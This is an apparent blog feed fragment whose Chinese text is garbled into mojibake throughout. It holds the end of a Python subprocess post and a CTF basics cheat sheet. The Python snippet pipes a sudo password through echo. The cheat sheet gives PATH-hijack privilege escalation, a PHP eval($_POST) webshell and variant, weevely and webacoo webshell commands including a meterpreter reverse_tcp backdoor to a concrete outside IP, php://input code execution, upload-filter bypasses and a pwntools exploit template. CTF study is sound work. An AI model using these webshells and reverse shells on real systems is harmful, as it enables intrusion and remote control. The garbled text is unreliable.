class="hljs-literal">None</span>,</span><span class="line">                        stderr=subprocess.STDOUT <span class="hljs-keyword">if</span> output <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>,</span><span class="line">                        universal_newlines=<span class="hljs-literal">True</span>)</span><span class="line"><span class="hljs-keyword">if</span> output:</span><span class="line">    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> proc.stdout:</span><span class="line">        sys.stdout.write(line)</span><span class="line">        output.write(line)</span><span class="line">proc.wait()</span></code></pre></div></div><h2 id="åœ¨æƒé™ä¸è¶³çš„æ—¶å€™å¦‚ä½•ä½¿ç”¨-sudo"><a href="#åœ¨æƒé™ä¸è¶³çš„æ—¶å€™å¦‚ä½•ä½¿ç”¨-sudo" class="headerlink" title="åœ¨æƒé™ä¸è¶³çš„æ—¶å€™å¦‚ä½•ä½¿ç”¨ sudo"></a>åœ¨æƒé™ä¸è¶³çš„æ—¶å€™å¦‚ä½•ä½¿ç”¨ sudo</h2><p>è¿™ä¸ªåˆ†ä¸¤ç§æƒ…å†µï¼Œä¸€ç§æ˜¯ç›´æ¥æ‰§è¡Œï¼Œå¦å¤–ä¸€ç§æ˜¯å¸Œæœ›åå°å¦èµ·è¿›ç¨‹æ‰§è¡Œã€‚å‚è€ƒ<a href="https://stackoverflow.com/questions/567542/running-a-command-as-a-super-user-from-a-python-script">è¿™ç¯‡æ–‡ç« </a></p><h3 id="ç›´æ¥æ‰§è¡Œ"><a href="#ç›´æ¥æ‰§è¡Œ" class="headerlink" title="ç›´æ¥æ‰§è¡Œ"></a>ç›´æ¥æ‰§è¡Œ</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">subprocess.run(shlex.split(<span class="hljs-string">f&quot;sudo -S <span class="hljs-subst">&#123;shell&#125;</span>&quot;</span>),</span><span class="line">                shell=<span class="hljs-literal">False</span>)</span></code></pre></div></div><p>è¿™æ ·å°±ä¼šæç¤ºéœ€è¦ sudo å¯†ç </p><h3 id="åå°æ‰§è¡Œ"><a href="#åå°æ‰§è¡Œ" class="headerlink" title="åå°æ‰§è¡Œ"></a>åå°æ‰§è¡Œ</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">passwd = getpass(<span class="hljs-string">&quot;Please enter your password: &quot;</span>)</span><span class="line">passwd_proc = subprocess.Popen(shlex.split(</span><span class="line">    <span class="hljs-string">f&quot;echo <span class="hljs-subst">&#123;passwd&#125;</span>&quot;</span>), stdout=subprocess.PIPE)</span><span class="line"></br></span><span class="line">subprocess.Popen(shlex.split(<span class="hljs-string">f&quot;sudo -S <span class="hljs-subst">&#123;shell&#125;</span>&quot;</span> <span class="hljs-keyword">if</span> sudo <span class="hljs-keyword">else</span> shell),</span><span class="line">                    shell=<span class="hljs-literal">False</span>,</span><span class="line">                    stdin=passwd_proc.stdout,</span><span class="line">                    stdout=output, stderr=output)</span></code></pre></div></div><p>è¿™ç§æ–¹å¼ç¨å¾®ç»•ä¸€ä¸‹ï¼Œä½†æ˜¯æ•ˆæœå¾ˆå¥½ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF åŸºç¡€çŸ¥è¯†ç‚¹</title>
      <link href="/2021/12/31/CTF-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
      <url>/2021/12/31/CTF-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<h2 id="è®­ç»ƒç«™ç‚¹"><a href="#è®­ç»ƒç«™ç‚¹" class="headerlink" title="è®­ç»ƒç«™ç‚¹"></a>è®­ç»ƒç«™ç‚¹</h2><p><a href="https://blog.csdn.net/Fly_hps/article/details/79783253">æ¨èè§„åˆ’</a></p><ul><li><a href="https://www.ichunqiu.com/battalion">iæ˜¥ç§‹è®­ç»ƒå¹³å°</a></li><li><a href="http://www.wechall.net/sites.php">We Chall</a> å›½å¤–æ”¶é›†çš„CTFå¹³å°</li><li><a href="https://microcorruption.com/login">å¾ˆç‚«é…·æ¸¸æˆåŒ–</a></li></ul><h2 id="ç³»ç»Ÿ-Exploit"><a href="#ç³»ç»Ÿ-Exploit" class="headerlink" title="ç³»ç»Ÿ Exploit"></a>ç³»ç»Ÿ Exploit</h2><h3 id="Linux-Exploit"><a href="#Linux-Exploit" class="headerlink" title="Linux Exploit"></a>Linux Exploit</h3><h3 id="Cç¼–è¯‘"><a href="#Cç¼–è¯‘" class="headerlink" title="Cç¼–è¯‘"></a>Cç¼–è¯‘</h3><p>åº”å½“ä¸ç”¨ä¿æŠ¤</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-llvm codeBlockLines"><span class="line">gcc <span class="hljs-number">1</span>.<span class="hljs-keyword">c</span> -o <span class="hljs-number">1</span> -O<span class="hljs-number">0</span> -fno-stack-protector -z execstack <span class="hljs-number">1</span>.<span class="hljs-keyword">c</span> -o <span class="hljs-number">1</span></span><span class="line"></br></span><span class="line">-m<span class="hljs-number">32</span>ï¼š <span class="hljs-number">32</span>bit ç¼–è¯‘</span></code></pre></div></div><h3 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h3><ul><li><a href="https://www.freebuf.com/articles/system/173903.html">å‚è€ƒ</a>è¿™ç¯‡æ–‡ç« </li></ul><h4 id="æŸ¥çœ‹å¯ä½¿ç”¨çš„æ‰§è¡Œæ–‡ä»¶"><a href="#æŸ¥çœ‹å¯ä½¿ç”¨çš„æ‰§è¡Œæ–‡ä»¶" class="headerlink" title="æŸ¥çœ‹å¯ä½¿ç”¨çš„æ‰§è¡Œæ–‡ä»¶"></a>æŸ¥çœ‹å¯ä½¿ç”¨çš„æ‰§è¡Œæ–‡ä»¶</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-routeros codeBlockLines"><span class="line"><span class="hljs-builtin-name">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type  f 2 &gt;/dev/<span class="hljs-literal">null</span></span></code></pre></div></div><p>é€šè¿‡è¿™ä¸ªå‘½ä»¤æŸ¥çœ‹å“ªäº›æ–‡ä»¶å¯ä»¥è¢«ç°åœ¨çš„ç”¨æˆ·ä½¿ç”¨ï¼Œå¹¶æ‰¾åˆ°ææƒæ–¹æ³•ã€‚</p><h4 id="ä¿®æ”¹å˜é‡æ”»å‡»"><a href="#ä¿®æ”¹å˜é‡æ”»å‡»" class="headerlink" title="ä¿®æ”¹å˜é‡æ”»å‡»"></a>ä¿®æ”¹å˜é‡æ”»å‡»</h4><p>æ€è·¯æ˜¯æ‰¾åˆ°<code>s</code>æƒé™çš„æ‰§è¡Œæ–‡ä»¶ï¼Œè¿™ä¸ªæ‰§è¡Œæ–‡ä»¶åŒ…æ‹¬è°ƒç”¨äº†æ›´é«˜çº§åˆ«çš„å‘½ä»¤ã€‚<br>é‚£ä¹ˆå°±å¯ä»¥é€šè¿‡ä¿®æ”¹å…¶ä¸­çš„å‘½ä»¤çš„è°ƒç”¨åœ°å€æ¥è¾¾åˆ°ç›®çš„</p><p>æ¯”å¦‚<code>flag01</code>ä½¿ç”¨åˆ°äº†<code>ps</code>å‘½ä»¤</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-powershell codeBlockLines"><span class="line"><span class="hljs-variable">$</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;/bin/bash&#x27;</span> &gt; /tmp/<span class="hljs-built_in">ps</span></span><span class="line"><span class="hljs-variable">$</span> chmod <span class="hljs-number">777</span> /tmp/<span class="hljs-built_in">ps</span></span><span class="line"><span class="hljs-variable">$</span> export PATH=/tmp:<span class="hljs-variable">$PATH</span></span><span class="line"><span class="hljs-variable">$</span> ./flag01</span></code></pre></div></div><h4 id="system-ä»»æ„å‘½ä»¤æ”»å‡»"><a href="#system-ä»»æ„å‘½ä»¤æ”»å‡»" class="headerlink" title="system() ä»»æ„å‘½ä»¤æ”»å‡»"></a>system() ä»»æ„å‘½ä»¤æ”»å‡»</h4><p>åŸç†æ˜¯ä½¿ç”¨printç³»å‡½æ•°å‘<code>buff</code>ä¸­å†™å…¥äº†å¯é€‰å­—ç¬¦ä¸²ï¼Œç„¶åé€šè¿‡<code>system()</code>è¿è¡Œ</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-cpp codeBlockLines"><span class="line"><span class="hljs-built_in">asprintf</span>(&amp;buffer, <span class="hljs-string">&quot;/bin/echo %s is cool&quot;</span>, <span class="hljs-built_in">getenv</span>(<span class="hljs-string">&quot;USER&quot;</span>));</span><span class="line"><span class="hljs-built_in">system</span>(buffer);</span></code></pre></div></div><p>ä¸Šä¾‹ä¸­å°±å°†<code>getenv(&#39;USER&#39;)</code>ä½œä¸ºå˜é‡è¾“å…¥ï¼Œåˆ©ç”¨æ–¹æ³•å°±æ˜¯ä¿®æ”¹ç¯å¢ƒå˜é‡è¾¾åˆ°ä»»æ„å‘½ä»¤çš„å†™å…¥</p><h3 id="Windows-Exploit"><a href="#Windows-Exploit" class="headerlink" title="Windows Exploit"></a>Windows Exploit</h3><h4 id="ææƒ-1"><a href="#ææƒ-1" class="headerlink" title="ææƒ"></a>ææƒ</h4><ul><li><a href="https://xz.aliyun.com/t/2519">æ€»ç»“æ–‡ç« </a></li></ul><h3 id="å­—èŠ‚åºï¼ˆå°ç«¯æœºå’Œå¤§ç«¯æœºï¼‰"><a href="#å­—èŠ‚åºï¼ˆå°ç«¯æœºå’Œå¤§ç«¯æœºï¼‰" class="headerlink" title="å­—èŠ‚åºï¼ˆå°ç«¯æœºå’Œå¤§ç«¯æœºï¼‰"></a>å­—èŠ‚åºï¼ˆå°ç«¯æœºå’Œå¤§ç«¯æœºï¼‰</h3><p>ä¸€èˆ¬æ¥è¯´ï¼ŒWIndowså’ŒLinuxéƒ½æ˜¯ä½¿ç”¨çš„å°ç«¯æœºæ¨¡å¼ã€‚<br>è€Œç½‘ç»œä¼ è¾“ä½¿ç”¨çš„æ˜¯å¤§ç«¯æœº</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> struct</span><span class="line">struct.pack(<span class="hljs-string">&#x27;&lt;i&#x27;</span>, <span class="hljs-number">0x01020304</span>)</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># &lt; æ˜¯å°ç«¯æ¨¡å¼</span></span><span class="line"><span class="hljs-comment"># i æ˜¯æ•´æ•°å‹</span></span></code></pre></div></div><h2 id="é€†å‘å·¥ç¨‹"><a href="#é€†å‘å·¥ç¨‹" class="headerlink" title="é€†å‘å·¥ç¨‹"></a>é€†å‘å·¥ç¨‹</h2><p>å¤§éƒ¨åˆ†å› ä¸ºéƒ½æ˜¯Linuxä¸‹é¢çš„é¢˜ç›®ï¼Œæ‰€ä»¥ä¸‹é¢å†™çš„é»˜è®¤ä¸ºLinuxæ“ä½œ</p><h3 id="é™æ€å·¥å…·"><a href="#é™æ€å·¥å…·" class="headerlink" title="é™æ€å·¥å…·"></a>é™æ€å·¥å…·</h3><h4 id="objdump"><a href="#objdump" class="headerlink" title="objdump"></a>objdump</h4><ol><li>å°†æ•´ä¸ªæ–‡ä»¶åæ±‡ç¼–Dumpä¸‹æ¥</li></ol><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-angelscript codeBlockLines"><span class="line">objdump -d -M <span class="hljs-built_in">int</span>el &lt;file_name&gt; &gt; dump.asm</span></code></pre></div></div><ol start="2"><li>è·å– got è¡¨</li></ol><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-xml codeBlockLines"><span class="line">objdump -R <span class="hljs-tag">&lt;<span class="hljs-name">file_name</span>&gt;</span></span></code></pre></div></div><h4 id="strings"><a href="#strings" class="headerlink" title="strings"></a>strings</h4><p>ç”¨äºæŸ¥æ‰¾æ–‡ä»¶ä¸­çš„å­—ç¬¦ä¸²</p><h4 id="ldd"><a href="#ldd" class="headerlink" title="ldd"></a>ldd</h4><p>ç”¨äºæŸ¥çœ‹åŠ¨æ€é“¾æ¥åº“</p><h4 id="file"><a href="#file" class="headerlink" title="file"></a>file</h4><p>æŸ¥çœ‹æ–‡ä»¶ç±»å‹</p><h4 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h4><p>æŸ¥çœ‹ä¿æŠ¤çŠ¶æ€</p><h4 id="åå…­è¿›åˆ¶ç¼–è¾‘"><a href="#åå…­è¿›åˆ¶ç¼–è¾‘" class="headerlink" title="åå…­è¿›åˆ¶ç¼–è¾‘"></a>åå…­è¿›åˆ¶ç¼–è¾‘</h4><p><code>hexeditor -b &lt;file&gt;</code></p><ul><li><code>ctrl + i</code> åå…­è¿›åˆ¶å’Œæ–‡æœ¬åˆ‡æ¢</li><li><code>ctrl + a</code> æ’å…¥</li><li><code>ctrl + d</code> åˆ é™¤</li><li><code>ctrl + o</code> ä¿å­˜</li></ul><h3 id="åŠ¨æ€è°ƒè¯•å·¥å…·"><a href="#åŠ¨æ€è°ƒè¯•å·¥å…·" class="headerlink" title="åŠ¨æ€è°ƒè¯•å·¥å…·"></a>åŠ¨æ€è°ƒè¯•å·¥å…·</h3><p><a href="https://x64dbg.com/#start">X64dbg</a></p><h3 id="è„±å£³"><a href="#è„±å£³" class="headerlink" title="è„±å£³"></a>è„±å£³</h3><p>å½“çœ‹åˆ°å…¶ä¸­åŒ…å«å¤§é‡çš„åŠ å¯†å­—æ®µï¼Œä¸è¦æ€€ç–‘æ˜¯å¦éœ€è¦è§£å¯†ï¼Œç›´æ¥æ‰¾æ‰¾å­—ç¬¦ä¸²ï¼Œçœ‹æ˜¯ä»€ä¹ˆå£³</p><h4 id="UPX"><a href="#UPX" class="headerlink" title="UPX"></a>UPX</h4><ul><li>upx è¿™æ ·çš„ç»å…¸å£³å¯ä»¥è‡ªåŠ¨è„±å£³</li></ul><p><code>upx -d &lt;file&gt;</code></p><h3 id="å…¶ä»–ç±»å‹é¢˜ç›®"><a href="#å…¶ä»–ç±»å‹é¢˜ç›®" class="headerlink" title="å…¶ä»–ç±»å‹é¢˜ç›®"></a>å…¶ä»–ç±»å‹é¢˜ç›®</h3><h4 id="æ•°ç‹¬"><a href="#æ•°ç‹¬" class="headerlink" title="æ•°ç‹¬"></a>æ•°ç‹¬</h4><p>è¦åšæ•°ç‹¬ï¼Œä¸€å®šä¼šç»™å‡ºåŸºç¡€æ•°å­—ä»¥åŠä½“ç§¯å…³ç³»ï¼Œæ¯”å¦‚<code>9*9</code>å¤§å°çš„å„ä¸ªæ•°å­˜åœ¨å†…å­˜ä¸­ã€‚</p><p>æ‰€ä»¥è§£é¢˜é€»è¾‘å°±æ˜¯æ‰¾åˆ°ç”³è¯·çš„å†…å­˜ï¼Œç„¶åå†æ‰¾åˆ°åˆå§‹åŒ–çš„æ•°å€¼ã€‚<br>æœ€åé€šè¿‡<a href="https://shudu.gwalker.cn/">åœ¨çº¿ç½‘ç«™</a>è§£å‡ºç­”æ¡ˆ<br>æäº¤çš„flagåŸå§‹æ•°æ®æ›¿æ¢ä¸º0ï¼Œå› ä¸ºæäº¤çš„ç­”æ¡ˆæ˜¯è¦éªŒè¯çš„ã€‚</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="å¯¹å›¾ç‰‡çš„éªŒè¯"><a href="#å¯¹å›¾ç‰‡çš„éªŒè¯" class="headerlink" title="å¯¹å›¾ç‰‡çš„éªŒè¯"></a>å¯¹å›¾ç‰‡çš„éªŒè¯</h3><p>ä½¿ç”¨çš„æ˜¯googleå¼€æºçš„å›¾ç‰‡è¯†åˆ«ç³»ç»Ÿ<code>pytesseract</code><br>å¯¹å›¾åƒçš„æ‰“å¼€ä½¿ç”¨çš„æ˜¯<code>PIL</code> <a href="https://www.cnblogs.com/wei-li/archive/2012/04/19/2443281.html">Python Image Library</a></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-pgsql codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> pytesseract</span><span class="line"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image</span><span class="line"></br></span><span class="line">img = Image.<span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;code.png&#x27;</span>)</span><span class="line"><span class="hljs-type">text</span> = pytesseract.image_to_string(img)</span></code></pre></div></div><h3 id="ä¸Šä¼ -webshell"><a href="#ä¸Šä¼ -webshell" class="headerlink" title="ä¸Šä¼  webshell"></a>ä¸Šä¼  webshell</h3><h4 id="ä¸€å¥è¯æœ¨é©¬"><a href="#ä¸€å¥è¯æœ¨é©¬" class="headerlink" title="ä¸€å¥è¯æœ¨é©¬"></a>ä¸€å¥è¯æœ¨é©¬</h4><p>åŸºæœ¬å‹</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-php codeBlockLines"><span class="line"><span class="hljs-meta">&lt;?php</span></span><span class="line">  <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);</span><span class="line"><span class="hljs-meta">?&gt;</span></span></code></pre></div></div><h5 id="å˜ä½“"><a href="#å˜ä½“" class="headerlink" title="å˜ä½“"></a>å˜ä½“</h5><p><a href="http://www.secist.com/archives/1947.html">è¿™é‡Œ</a>æ˜¯å˜å½¢ä½“çš„æ€»ç»“</p><ol><li>ä¿®æ”¹è„šæœ¬è¯­è¨€æ ‡ç­¾</li></ol><p><code>&lt;?php ?&gt;</code> ä¸º <code>&lt;script language=&quot;PHP&quot;&gt; &lt;/script&gt;</code></p><p>æ³¨æ„ä¸º<code>&quot;</code></p><h4 id="webshell-å·¥å…·"><a href="#webshell-å·¥å…·" class="headerlink" title="webshell å·¥å…·"></a>webshell å·¥å…·</h4><h5 id="CKnife"><a href="#CKnife" class="headerlink" title="CKnife"></a>CKnife</h5><p>è¿™é‡Œæ˜¯è·¨å¹³å°CKnifeçš„ <a href="https://github.com/Chora10/Cknife">Github</a> åœ°å€</p><h5 id="webcaoo"><a href="#webcaoo" class="headerlink" title="webcaoo"></a>webcaoo</h5><ul><li><p>ç”Ÿæˆ</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-css codeBlockLines"><span class="line">webacoo -g -o <span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.php</span></span></code></pre></div></div></li><li><p>è¿æ¥</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-xml codeBlockLines"><span class="line">webacoo -t -u <span class="hljs-tag">&lt;<span class="hljs-name">url</span>&gt;</span></span></code></pre></div></div></li></ul><h5 id="weevely"><a href="#weevely" class="headerlink" title="weevely"></a>weevely</h5><ul><li>ç”Ÿæˆ</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-verilog codeBlockLines"><span class="line">weevely <span class="hljs-keyword">generate</span> &lt;password&gt; &lt;path&gt;</span></code></pre></div></div><ul><li>è¿æ¥</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-xml codeBlockLines"><span class="line">weevely <span class="hljs-tag">&lt;<span class="hljs-name">URL</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span> [cmd]</span></code></pre></div></div><ul><li>å¸¸ç”¨å‘½ä»¤<div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-elixir codeBlockLines"><span class="line"><span class="hljs-symbol">:system_info</span> æ”¶é›†ç³»ç»ŸåŸºæœ¬ä¿¡æ¯</span><span class="line"><span class="hljs-symbol">:audit_filesystem</span> æŸ¥æ‰¾ç³»ç»Ÿæ–‡ä»¶ä¸­çš„å¼±æƒé™</span><span class="line"><span class="hljs-symbol">:audit_suidsgid</span> æŸ¥æ‰¾æœ‰ä½¿ç”¨é«˜çº§æƒé™çš„æ–‡ä»¶</span><span class="line"><span class="hljs-symbol">:shell_sh</span> æ‰§è¡ŒSHELLå‘½ä»¤</span><span class="line"><span class="hljs-symbol">:backdoor_meterpreter</span> é€šè¿‡meterpreterè¿æ¥</span><span class="line">&gt; backdoor_meterpreter -payload linux/x64/meterpreter/reverse_tcp -host <span class="hljs-number">144.34</span>.<span class="hljs-number">215.199</span> -port <span class="hljs-number">4444</span></span><span class="line">&gt; msfconsole(LHOST <span class="hljs-number">127.0</span>.0.<span class="hljs-number">1</span>)</span><span class="line"><span class="hljs-symbol">:file_download</span> ä¸‹è½½æ–‡ä»¶</span><span class="line"><span class="hljs-symbol">:sql_console</span> sqläº¤äº’</span><span class="line"><span class="hljs-symbol">:sql_dump</span> è„±åº“</span><span class="line"><span class="hljs-symbol">:net_scan</span> ç½‘ç»œæ‰«æ</span></code></pre></div></div></li></ul><h4 id="æ–‡ä»¶ä¸Šä¼ æ¼æ´"><a href="#æ–‡ä»¶ä¸Šä¼ æ¼æ´" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ æ¼æ´"></a>æ–‡ä»¶ä¸Šä¼ æ¼æ´</h4><ol><li>åœ¨<code>phpinfo()</code>ä¸­<code>allow_url_include</code>å¤„äºå¼€å¯çŠ¶æ€ï¼Œæ„å‘³ç€å¯ä»¥ä½¿ç”¨<code>RAW_POST</code>æäº¤æ•°æ®</li></ol><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">&lt;url&gt;?path=php://input</span><span class="line"></br></span><span class="line">post:</span><span class="line">&lt;?php system(<span class="hljs-string">&#x27;ls&#x27;</span>); ?&gt;</span></code></pre></div></div><ol start="2"><li>æ–‡ä»¶çš„å†™å…¥é™¤äº†<code>fwrite()</code> è¿˜æœ‰**<code>file_put_contents</code>**</li></ol><p><code>file_put_contents</code>é™¤äº†<code>string</code>è¿˜æ”¯æŒæ•°ç»„ã€‚</p><p>æ‰€ä»¥å¯ä»¥åƒ<code>data[]=&lt;?php eval() ?&gt;</code>è¿™æ ·ï¼Œé€šè¿‡æ•°ç»„ç»•è¿‡æ­£åˆ™æ£€æµ‹ã€‚</p><ol start="3"><li>é™åˆ¶ä¸Šä¼ </li></ol><p>å½“å‡ºç°é™åˆ¶ä¸Šä¼ çš„æ—¶å€™ï¼Œåº”è¯¥é¦–å…ˆè€ƒè™‘æ˜¯å¦æœ‰<code>javascript</code>è„šæœ¬æˆ–è€…é€šè¿‡ä¿®æ”¹<code>Content-Type</code>ç±»å‹æ¥è¾¾åˆ°ç»•è¿‡çš„ç›®çš„ã€‚ã€</p><h2 id="Pwntools"><a href="#Pwntools" class="headerlink" title="Pwntools"></a>Pwntools</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span></code></pre></div></div><h3 id="è¿æ¥"><a href="#è¿æ¥" class="headerlink" title="è¿æ¥"></a>è¿æ¥</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ini codeBlockLines"><span class="line"><span class="hljs-attr">c</span> = remote(ip, port)</span></code></pre></div></div><h3 id="å‘é€å’Œæ¥æ”¶"><a href="#å‘é€å’Œæ¥æ”¶" class="headerlink" title="å‘é€å’Œæ¥æ”¶"></a>å‘é€å’Œæ¥æ”¶</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-autoit codeBlockLines"><span class="line"><span class="hljs-built_in">send</span>(payload) <span class="hljs-meta"># å‘é€payload</span></span><span class="line">sendline(payload)  <span class="hljs-meta"># å‘é€payload, å·²\næ¢è¡Œ</span></span><span class="line">sendafter(some_string, payload) <span class="hljs-meta"># æ¥å—åˆ°some_stringåå‘é€payload</span></span><span class="line"></br></span><span class="line">recvn(n) <span class="hljs-meta"># æ¥å—Nï¼ˆæ•°å­—ï¼‰å­—ç¬¦</span></span><span class="line">recvline() <span class="hljs-meta">#æ¥å—ä¸€è¡Œè¾“å‡º</span></span><span class="line">recvlines(n) <span class="hljs-meta"># æ¥æ”¶Nè¡Œè¾“å‡º</span></span><span class="line">recvuntil(some_string) <span class="hljs-meta"># æ¥æ”¶åˆ° some_string ä¸ºæ­¢</span></span></code></pre></div></div><h3 id="è½¬ç "><a href="#è½¬ç " class="headerlink" title="è½¬ç "></a>è½¬ç </h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-apache codeBlockLines"><span class="line"><span class="hljs-attribute">p32</span>(<span class="hljs-number">0</span>x<span class="hljs-number">01020304</span>) # &#x27;\x<span class="hljs-number">04</span>\x<span class="hljs-number">03</span>\x<span class="hljs-number">02</span>\x<span class="hljs-number">01</span>&#x27;</span><span class="line"><span class="hljs-comment"># å°ç«¯åºæ ¼å¼è½¬åŒ–4ä¸ªå­—èŠ‚</span></span><span class="line"><span class="hljs-attribute">p64</span>()</span><span class="line"><span class="hljs-attribute">p16</span>()</span></code></pre></div></div><h3 id="äº¤äº’"><a href="#äº¤äº’" class="headerlink" title="äº¤äº’"></a>äº¤äº’</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-angelscript codeBlockLines"><span class="line">c.<span class="hljs-built_in">int</span>eractive()</span></code></pre></div></div><h3 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-livecodeserver codeBlockLines"><span class="line">p = <span class="hljs-built_in">process</span>(<span class="hljs-string">&#x27;./prc&#x27;</span>) <span class="hljs-comment"># è¿è¡Œè®¾ç½®è¦è¿è¡Œçš„ç¨‹åº</span></span><span class="line">context.log_level = <span class="hljs-string">&#x27;DEBUG&#x27;</span> <span class="hljs-comment"># æ˜¾ç¤ºæ‰€æœ‰è¾“å…¥è¾“å‡ºä¿¡æ¯</span></span><span class="line">context.terminal = [<span class="hljs-string">&#x27;gnome-terminal&#x27;</span>, <span class="hljs-string">&#x27;-x&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>] <span class="hljs-comment"># è®¾ç½®è¿è¡Œçš„terminalï¼Œ è¿˜å¯ä»¥å®‰è£…tmux</span></span><span class="line">gdb.attach(p)</span></code></pre></div></div><h3 id="åŸºæœ¬æ¨¡æ¿"><a href="#åŸºæœ¬æ¨¡æ¿" class="headerlink" title="åŸºæœ¬æ¨¡æ¿"></a>åŸºæœ¬æ¨¡æ¿</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><span class="line">context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span> <span class="hljs-comment">#debugæ¨¡å¼,å¯è¾“å‡ºè¯¦ç»†ä¿¡æ¯</span></span><span class="line">conn = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span> , <span class="hljs-number">12345</span>) <span class="hljs-comment">#é€šè¿‡socatå°†äºŒè¿›åˆ¶æ–‡ä»¶è¿è¡Œåœ¨æŸä¸ªç«¯å£ä¹‹å,å¯ä½¿ç”¨æœ¬è¯­å¥å»ºç«‹è¿æ¥,æ˜“äºåœ¨æœ¬åœ°ä¸è¿œç¨‹ä¹‹é—´è½¬æ¢ã€‚</span></span><span class="line"><span class="hljs-built_in">print</span> <span class="hljs-built_in">str</span>(pwnlib.util.proc.pidof(<span class="hljs-string">&#x27;&lt;file_name&gt;&#x27;</span>)[<span class="hljs-number">0</span>]) <span class="hljs-comment">#è¿™ä¸¤æ¡ä¾¿äºåœ¨gdbä¸‹è¿…é€Ÿattach ä¸Šå¯¹åº”çš„pid</span></span><span class="line"></br></span><span class="line"><span class="hljs-comment">## context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span></span><span class="line">gdb.attach(proc.pidof(<span class="hljs-string">&#x27;&lt;file_name&gt;&#x27;</span>)[<span class="hljs-number">0</span>])</span><span class="line"></br></span><span class="line">raw_input(<span class="hljs-string">&#x27;continue&#x27;</span>)</span><span class="line">conn.recvuntil(<span class="hljs-string">&#x27;Welcome&#x27;</span>) <span class="hljs-comment">#ä¸¤ç§ä¸åŒçš„recv</span></span><span class="line">conn.recv(<span class="hljs-number">2048</span>)</span><span class="line">shellcode = p32(<span class="hljs-number">0x0804a028</span>) <span class="hljs-comment">#ç”¨äºå°†æ•°å­—å˜æˆ\x28\xa0\x04\x08çš„å½¢å¼</span></span><span class="line">conn.sendline(shellcode) <span class="hljs-comment">#å‘ç¨‹åºå‘é€ä¿¡æ¯,ä½¿ç”¨sendlineè€Œésendæ˜¯ä¸ªå¥½ä¹ æƒ¯</span></span><span class="line">conn.interactive() <span class="hljs-comment">#æ‹¿åˆ°shellä¹‹å,ç”¨æ­¤è¿›è¡Œäº¤äº’</span></span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><span class="line">pwn=remote(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-string">&quot;12345&quot;</span>)</span><span class="line">payload=<span class="hljs-string">&#x27;A&#x27;</span>*<span 